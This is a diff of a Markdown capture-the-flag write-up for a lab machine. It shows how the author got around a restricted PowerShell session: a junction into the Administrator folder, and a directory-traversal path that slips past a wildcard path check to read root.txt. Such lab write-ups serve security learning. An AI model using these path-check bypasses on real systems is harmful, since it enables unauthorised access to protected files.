 ```
 
-This function runs the `Get-Content` cmdlet, but first checks to see if the path of the file supplied contains `D:\` or `C:\ProgramData\`, and only works if this is true.  It seems that there must be some file in these directories that would hopefully point me in the right direction.
+This function runs the `Get-Content` cmdlet, but first checks to see if the path of the file supplied contains `D:\` or `C:\ProgramData\`, and only works if this is true. It seems that there must be some file in these directories that would hopefully point me in the right direction.
 
-```
+```text
 [10.10.10.210]: PS>.{type jea_test_account.pssc}
 @{
 
@@ -1193,7 +1150,7 @@ LanguageMode = 'NoLanguage'
 
 The second configuration file confirmed my suspicions that I had been locked into `NoLanguage` mode, which explained why I couldn't use custom functions anymore.
 
-```
+```text
 [10.10.10.210]: P> .{cd D:\}
 cd : Cannot find drive. A drive with the name 'D' does not exist.
 At line:1 char:3                                                                                       
@@ -1205,12 +1162,12 @@ At line:1 char:3
 
 It did not appear that there even was a `D` drive, so I checked out the other folder
 
-* https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell
-* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1
+* [https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell](https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell)
+* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1)
 
 Two paths forward
 
-```
+```text
 [10.10.10.210]: P> .{New-PSDrive -Name "D" -PsProvider "FileSystem" -Root "C:\"}                       
 
 Name           Used (GB)     Free (GB) Provider      Root                                CurrentLocati
@@ -1224,7 +1181,7 @@ D                                      FileSystem    C:\
 
 desc
 
-```
+```text
 [10.10.10.210]: P> .{cd D:\Users}
 [10.10.10.210]: P> .{ls}
 
@@ -1239,14 +1196,14 @@ d-----        7/30/2020  12:13 PM                .NET v2.0 Classic
 d-----        7/28/2020   2:53 PM                Administrator                                        
 d-----        7/30/2020  12:13 PM                Classic .NET AppPool                                 
 d-----        7/30/2020   1:17 PM                k.svensson                                           
-d-r---        8/22/2013   5:39 PM                Public 
+d-r---        8/22/2013   5:39 PM                Public
 ```
 
 I was able to link the C drive to the D drive letter, however the `jea_test_account` was not able to see it
 
-* https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell
+* [https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell](https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell)
 
-```
+```text
 [10.10.10.210]: PS>.{New-Item -Path C:\ProgramData\Administrator\ -ItemType SymbolicLink -Value C:\Users\Administrator\}                                                                                      
 New-Item : Administrator privilege required for this operation.
 At line:1 char:3                                                                                       
@@ -1260,7 +1217,7 @@ At line:1 char:3
 
 desc
 
-```
+```text
 [10.10.10.210]: PS>.{New-Item -Path C:\ProgramData\Desk\ -ItemType Junction -Value C:\Users\Administrator\}                                                                                                   
 
 
@@ -1274,28 +1231,26 @@ d----l        2/16/2021  11:19 PM                Desk
 
 desc
 
+#### Getting a shell
 
+#### Root.txt
 
-### Getting a shell
-
-
-### Root.txt
-
-```
+```text
 [10.10.10.210]: PS>Check-File C:\ProgramData\Desk\Desktop\root.txt                                     
 e145465135ac264800cee7d8dda0dbba
 ```
 
 AFter going through all of the trouble to create a link to the folders, I realized that I could also do it more simply...with directory traversal!
 
-```
+```text
 [10.10.10.210]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
 
 e145465135ac264800cee7d8dda0dbba
 ```
 
-Since the custom function was looking for a path with the -Like parameter and a `*` wildcard, anything could be put after the path `C:\ProgramData\`.  This includes directory traversal paths such as `..\`
+Since the custom function was looking for a path with the -Like parameter and a `*` wildcard, anything could be put after the path `C:\ProgramData\`. This includes directory traversal paths such as `..\`
 
 Thanks to [`cube0x0`](https://app.hackthebox.eu/users/9164) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+
